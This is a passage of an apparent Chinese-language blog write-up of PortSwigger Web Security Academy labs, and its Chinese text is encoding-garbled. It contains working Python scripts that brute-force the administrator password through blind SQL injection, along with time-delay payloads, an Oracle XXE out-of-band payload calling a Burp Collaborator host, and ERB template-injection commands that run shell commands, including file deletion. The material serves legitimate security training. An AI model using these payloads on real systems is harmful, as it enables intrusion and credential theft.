<span class="line"><span class="token keyword">import</span> threading</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"><span class="token keyword">import</span> re</span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    url <span class="token operator">=</span> <span class="token string">&#39;https://0af2001e046c8c13c012318000590007.web-security-academy.net/filter?category=Pets&#39;</span></span>
<span class="line">    headers <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#39;</span><span class="token punctuation">}</span></span>
<span class="line">    cookies <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&quot;TrackingId&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;wIqZZ59H8RfHNV9L&#39; AND (SELECT SUBSTRING(password,</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">}</span></span>
<span class="line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></span>
<span class="line">    regex <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&quot;Welcome back!&quot;</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        passlist<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> char</span>
<span class="line">        password <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passlist<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;The password is </span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    chars <span class="token operator">=</span> <span class="token string">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span></span>
<span class="line">    length <span class="token operator">=</span> <span class="token number">20</span></span>
<span class="line">    passlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">]</span><span class="token operator">*</span>length</span>
<span class="line">    start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></span>
<span class="line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span></span>
<span class="line">            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_pass<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> char<span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line">            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> t <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span></span>
<span class="line">            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span>
<span class="line">    finish <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;It takes </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">round</span><span class="token punctuation">(</span>finish <span class="token operator">-</span> start<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> s&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="/sake-s-blog/assets/image-20221113213111798-Ddbv7UTO.png" alt="image-20221113213111798"></p><p>è·å¾—å¯†ç ï¼Œæˆ‘ä»¬å°è¯•ç™»å½•administratorï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221113213148104-C8UYlNVb.png" alt="image-20221113213148104"></p><h2 id="å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„sqlç›²æ³¨" tabindex="-1"><a class="header-anchor" href="#å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„sqlç›²æ³¨"><span>å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„SQLç›²æ³¨</span></a></h2><blockquote><p>é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å¦‚ä½•æµ‹è¯•å•ä¸ªå¸ƒå°”æ¡ä»¶å¹¶åœ¨æ¡ä»¶ä¸ºçœŸæ—¶è§¦å‘æ•°æ®åº“é”™è¯¯ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</td></tr><tr><td>å¾®è½¯</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td></tr><tr><td>PostgreSQL</td><td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</td></tr><tr><td>MySQL</td><td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</td></tr></tbody></table><p><strong>åˆ†æä¸€ä¸‹è¡¨è¾¾å¼ï¼š</strong></p><p>å¦‚æœCONDITIONä¸ºçœŸï¼Œåˆ™æ‰§è¡Œto_char(1/0)æˆ–è€…æ˜¯1/0ï¼Œå› ä¸ºå‡ºç°äº†é™¤0çš„é”™è¯¯ï¼Œæ‰€ä»¥è¿”å›æŠ¥é”™Internal Server Errorï¼›åä¹‹ï¼ŒCONDITIONä¸ºå‡æ—¶ï¼Œæ‰§è¡ŒNULLè¿”å›NULLä¸æŠ¥é”™ï¼Œé¡µé¢æ­£å¸¸æ˜¾ç¤ºå†…å®¹ã€‚</p></blockquote><p><strong>çœ‹äº†çœ¼hintå¾—çŸ¥Labä½¿ç”¨çš„æ˜¯Oracleæ•°æ®åº“ï¼Œç›´æ¥æŠŠä¸Šä¸€é¢˜çš„è„šæœ¬æ”¹æ”¹å°±èƒ½ç”¨ï¼ŒæŠŠæ­£åˆ™åŒ¹é…çš„å†…å®¹æ”¹ä¸ºInternal Server Errorï¼Œæˆ–è€…æ˜¯åˆ¤æ–­responseçš„çŠ¶æ€ç ã€‚</strong></p><p>è¿™é‡Œæˆ‘ä»¬æ„é€ å…ˆä¸€ä¸ªå­æŸ¥è¯¢<code>&#39;|| (SELECT CASE WHEN (length(password)&gt;1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#39;administrator&#39;)||&#39;</code>æ¥åˆ¤æ–­å¯†ç é•¿åº¦ï¼Œä»¥æ­¤ç±»æ¨æœ€ç»ˆåˆ¤æ–­å‡ºæ¥å¯†ç é•¿åº¦æ˜¯20</p><p><img src="/sake-s-blog/assets/image-20221115215315673-C4gzkXoN.png" alt="image-20221115215315673"></p><p>æœ‰äº†ä¸Šä¸€Labçš„ç»éªŒï¼Œæˆ‘ä»¬ç›´æ¥ä¸Šè„šæœ¬ï¼Œçˆ†ç ´ä¸€ä¸‹å¯†ç </p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">import</span> requests</span>
<span class="line"><span class="token keyword">import</span> threading</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"><span class="token keyword">import</span> re</span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    url <span class="token operator">=</span> <span class="token string">&#39;https://0a580032035afa26c09136e300d100e0.web-security-academy.net/filter?category=Pets&#39;</span></span>
<span class="line">    headers <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#39;</span><span class="token punctuation">}</span></span>
<span class="line">    cookies <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&quot;TrackingId&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;wIqZZ59H8RfHNV9L&#39;||(select case when substr(password,</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1)=&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">&#39; then to_char(1/0) else NULL end from users where username=&#39;administrator&#39;)||&#39;&quot;</span></span><span class="token punctuation">}</span></span>
<span class="line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></span>
<span class="line">    regex <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&quot;Internal Server Error&quot;</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        passlist<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> char</span>
<span class="line">        password <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passlist<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;The password is </span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    chars <span class="token operator">=</span> <span class="token string">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span></span>
<span class="line">    length <span class="token operator">=</span> <span class="token number">20</span></span>
<span class="line">    passlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">]</span><span class="token operator">*</span>length</span>
<span class="line">    start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></span>
<span class="line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span></span>
<span class="line">            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_pass<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> char<span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line">            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> t <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span></span>
<span class="line">            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></span>
<span class="line">    finish <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;It takes </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">round</span><span class="token punctuation">(</span>finish <span class="token operator">-</span> start<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> s&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="/sake-s-blog/assets/image-20221120104000722-CtO3faZ2.png" alt="image-20221120104000722"></p><p>è¿™é‡Œä½¿ç”¨intruderä¹Ÿå¯ä»¥å¾—åˆ°ç›¸åŒç»“æœ <img src="/sake-s-blog/assets/image-20221120105032212-DmJDe60R.png" alt="image-20221120105032212"></p><p>è·å¾—å¯†ç ï¼Œå°è¯•ç™»å½•administratorï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221120103940765-BM-NortL.png" alt="image-20221120103940765"></p><h2 id="å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„sqlæ³¨å…¥" tabindex="-1"><a class="header-anchor" href="#å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„sqlæ³¨å…¥"><span>å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„SQLæ³¨å…¥</span></a></h2><blockquote><p>ä»»åŠ¡æ˜¯é€ æˆä¸€ä¸ªåç§’çš„å»¶æ—¶ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹å¦‚ä½•åœ¨å¤„ç†æŸ¥è¯¢æ—¶ï¼Œä½¿æ•°æ®åº“å‡ºç°<strong>æ—¶é—´å»¶è¿Ÿ</strong>ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>dbms_pipe.receive_message((&#39;a&#39;),10)</td></tr><tr><td>å¾®è½¯</td><td>WAITFOR DELAY &#39;0:0:10&#39;</td></tr><tr><td>PostgreSQL</td><td>SELECT pg_sleep(10)</td></tr><tr><td>MySQL</td><td>SELECT SLEEP(10)</td></tr></tbody></table></blockquote><p>è¿™é‡Œæˆ‘ä»¬åªéœ€è¦åœ¨æ³¨å…¥ç‚¹æ’å…¥ä¸€ä¸ªå»¶æ—¶è¯­å¥å³å¯è§£å†³lab</p><p><img src="/sake-s-blog/assets/image-20221120111356248-CmeAtDeJ.png" alt="image-20221120111356248"></p><p><img src="/sake-s-blog/assets/image-20221120111406745-OoxZmTkM.png" alt="image-20221120111406745"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">TrackingId=BDiRNvzhMTPO0qtL&#39;||pg_sleep(10)--;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„sqlç›²æ³¨" tabindex="-1"><a class="header-anchor" href="#å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„sqlç›²æ³¨"><span>å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„SQLç›²æ³¨</span></a></h2><h2 id="oobç›²æ³¨" tabindex="-1"><a class="header-anchor" href="#oobç›²æ³¨"><span>OOBç›²æ³¨</span></a></h2><p><img src="/sake-s-blog/assets/image-20221120115115857-BLMpBrzV.png" alt="image-20221120115115857"></p><p>b5hpcwzn3c60fubud2jmosu1bshk59.burpcollaborator.net</p><p><img src="/sake-s-blog/assets/image-20221120115418060-B7_nGnXe.png" alt="image-20221120115418060"></p><p><img src="/sake-s-blog/assets/image-20221120115235579-DkWydmIS.png" alt="image-20221120115235579"></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">TrackingId=x&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="" tabindex="-1"><a class="header-anchor" href="#"><span>------------------------------</span></a></h2><h1 id="xss" tabindex="-1"><a class="header-anchor" href="#xss"><span><strong>XSS</strong></span></a></h1><p><img src="/sake-s-blog/assets/image-20221120120155457-BR1jdXoj.png" alt="image-20221120120155457"></p><blockquote><p><strong>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆä¹Ÿç§°ä¸º XSSï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…ç ´åç”¨æˆ·ä¸æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚å®ƒå…è®¸æ”»å‡»è€…è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨å°†ä¸åŒçš„ç½‘ç«™å½¼æ­¤éš”ç¦»ã€‚è·¨ç«™ç‚¹è„šæœ¬æ¼æ´é€šå¸¸å…è®¸æ”»å‡»è€…ä¼ªè£…æˆå—å®³ç”¨æˆ·ï¼Œæ‰§è¡Œç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„ä»»ä½•æ“ä½œï¼Œå¹¶è®¿é—®ç”¨æˆ·çš„ä»»ä½•æ•°æ®ã€‚å¦‚æœå—å®³ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­å…·æœ‰ç‰¹æƒè®¿é—®æƒé™ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰åŠŸèƒ½å’Œæ•°æ®ã€‚</strong></p></blockquote><h2 id="æ— ç¼–ç åå°„å‹xss" tabindex="-1"><a class="header-anchor" href="#æ— ç¼–ç åå°„å‹xss"><span>æ— ç¼–ç åå°„å‹XSS</span></a></h2><p><img src="/sake-s-blog/assets/image-20221120121500672-B18LTdR-.png" alt="image-20221120121500672"></p><p><img src="/sake-s-blog/assets/image-20221120121514302-BPIE0kEL.png" alt="image-20221120121514302"></p><h2 id="-1" tabindex="-1"><a class="header-anchor" href="#-1"><span>------------------------------</span></a></h2><h1 id="ssti" tabindex="-1"><a class="header-anchor" href="#ssti"><span><strong>SSTI</strong></span></a></h1><p><img src="/sake-s-blog/assets/image-20230121195535830-I1FT56PP.png" alt="image-20230121195535830"></p><blockquote><p>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨æ¨¡æ¿è‡ªèº«è¯­æ³•å°†æ¶æ„è´Ÿè½½æ³¨å…¥æ¨¡æ¿ï¼Œç„¶ååœ¨æœåŠ¡ç«¯æ‰§è¡Œã€‚</p><p>æ¨¡æ¿å¼•æ“è¢«è®¾è®¡æˆé€šè¿‡ç»“åˆå›ºå®šæ¨¡æ¿å’Œå¯å˜æ•°æ®æ¥ç”Ÿæˆç½‘é¡µã€‚å½“ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ å…¥æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”ŸæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥ä»»æ„æ¨¡æ¿æŒ‡ä»¤æ¥æ“çºµæ¨¡æ¿å¼•æ“ï¼Œä»è€Œèƒ½å¤Ÿå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚é¡¾åæ€ä¹‰ï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æœ‰æ•ˆè´Ÿè½½æ˜¯åœ¨æœåŠ¡ç«¯äº¤ä»˜å’Œæ‰§è¡Œçš„ï¼Œè¿™å¯èƒ½ä½¿å®ƒä»¬æ¯”å…¸å‹çš„å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ›´å±é™©ã€‚</p></blockquote><blockquote><p>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ä¼šä½¿ç½‘ç«™é¢ä¸´å„ç§æ”»å‡»ï¼Œå…·ä½“å–å†³äºæ‰€è®¨è®ºçš„æ¨¡æ¿å¼•æ“ä»¥åŠåº”ç”¨ç¨‹åºå¦‚ä½•ä½¿ç”¨å®ƒã€‚åœ¨æå°‘æ•°æƒ…å†µä¸‹ï¼Œè¿™äº›æ¼æ´ä¸ä¼šå¸¦æ¥çœŸæ­£çš„å®‰å…¨é£é™©ã€‚ç„¶è€Œï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“å¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚</p><p>æœ€ä¸¥é‡çš„æƒ…å†µæ˜¯ï¼Œæ”»å‡»è€…æœ‰å¯èƒ½å®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œå®Œå…¨æ§åˆ¶åç«¯æœåŠ¡å™¨ï¼Œå¹¶åˆ©ç”¨å®ƒå¯¹å†…éƒ¨åŸºç¡€è®¾æ–½è¿›è¡Œå…¶ä»–æ”»å‡»ã€‚</p><p>å³ä½¿åœ¨ä¸å¯èƒ½å®Œå…¨æ‰§è¡Œè¿œç¨‹ä»£ç çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…é€šå¸¸ä»å¯ä»¥ä½¿ç”¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ä½œä¸ºè®¸å¤šå…¶ä»–æ”»å‡»çš„åŸºç¡€ï¼Œä»è€Œå¯èƒ½è·å¾—æœåŠ¡å™¨ä¸Šæ•æ„Ÿæ•°æ®å’Œä»»æ„æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚</p><p>å½“ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­è€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ å…¥æ—¶ï¼Œå°±ä¼šå‡ºç°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚</p></blockquote><h2 id="basic-server-side-template-injection" tabindex="-1"><a class="header-anchor" href="#basic-server-side-template-injection"><span>Basic server-side template injection</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>ç”±äºERBæ¨¡æ¿çš„ä¸å®‰å…¨æ„é€ ï¼Œæ­¤å®éªŒå®¤å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ã€‚ è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·æŸ¥çœ‹ERBæ–‡æ¡£ï¼Œäº†è§£å¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä»Carlosçš„ä¸»ç›®å½•ä¸­åˆ é™¤morale.txtæ–‡ä»¶ã€‚</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>éšä¾¿ç‚¹å‡»ä¸€ä¸ªå•†å“è¯¦ç»†ï¼Œè¯·æ±‚çš„messageå¯æ§ï¼Œä¸”èƒ½å›æ˜¾åˆ°é¡µé¢ä¸Šï¼Œç›®æ ‡æ³¨å…¥ç‚¹å°±åœ¨è¿™é‡Œ</p><p><img src="/sake-s-blog/assets/image-20230121201829437-BGdlvYtr.png" alt="image-20230121201829437"></p><p>å…ˆå»å®˜æ–¹æ–‡æ¡£äº†è§£ä¸€ä¸‹RUBYçš„<a href="https://docs.ruby-lang.org/en/master/ERB.html" target="_blank" rel="noopener noreferrer">ERBæ¨¡æ¿<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼Œå¯ä»¥çœ‹åˆ°**&lt;%= Ruby expression -- replace with result %&gt;**è¡¨ç¤ºè¯¥æ ¼å¼å¯ä»¥å†…åµŒè¡¨è¾¾å¼</p><p><img src="/sake-s-blog/assets/image-20230121202308832-Dmws_u13.png" alt="image-20230121202308832"></p><p><img src="/sake-s-blog/assets/image-20230121202402896-BZrgBVg8.png" alt="image-20230121202402896"></p><p>å†æŸ¥ä¸€ä¸‹RUBYå¦‚ä½•æ‰§è¡Œshellå‘½ä»¤ï¼Œä½¿ç”¨execå’Œsystemå‡å¯ï¼ŒåŒºåˆ«æ˜¯ï¼š<strong>execä¼šæ›¿æ¢å½“å‰è¿›ç¨‹ï¼Œsystemè¿”å›æ‰§è¡Œç»“æœ(å¸ƒå°”å€¼)</strong></p><p><img src="/sake-s-blog/assets/image-20230121204039682-RGXfANuj.png" alt="image-20230121204039682"></p><p><img src="/sake-s-blog/assets/image-20230121204108869-CtUoyi-b.png" alt="image-20230121204108869"></p><p>äºæ˜¯æˆ‘ä»¬åœ¨ä¿®æ”¹messageè¯·æ±‚å†…å®¹ä¸º<code>&lt;%= system &#39;ls&#39; %&gt;</code>ï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶åˆ—è¡¨<img src="/sake-s-blog/assets/image-20230121204729823-Dn4zMzlC.png" alt="image-20230121204729823"></p><p>æ¥ç€ä¿®æ”¹ä¸º<code>&lt;%= system &#39;rm morale.txt&#39; 